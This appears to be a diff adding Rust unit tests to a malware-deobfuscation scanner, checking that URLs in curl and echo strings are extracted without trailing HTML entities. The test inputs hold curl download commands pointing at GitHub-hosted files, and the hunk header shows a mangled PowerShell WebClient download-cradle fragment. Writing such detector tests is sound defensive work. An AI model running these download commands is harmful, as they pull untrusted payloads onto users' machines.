@@ -16675,6 +16675,68 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn curl_html_quote_entity_tail_is_trimmed_from_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl https://github.com/abarekl1/dcm/raw/main/Document.zip&#039 -o out.zip"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/abarekl1/dcm/raw/main/Document.zip"
+                )
+            }),
+            "HTML entity-tailed curl URL was not recovered cleanly: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("&#039")
+                )
+            }),
+            "HTML entity tail leaked into URL traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn generic_html_quote_entity_tail_is_trimmed_from_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"echo artifact: https://github.com/abarekl1/i/blob/main/f.png&quot"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://github.com/abarekl1/i/blob/main/f.png"
+                )
+            }),
+            "HTML entity-tailed generic URL was not recovered cleanly: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("&quot")
+                )
+            }),
+            "HTML entity tail leaked into generic URL traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_schemeless_domain_path_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
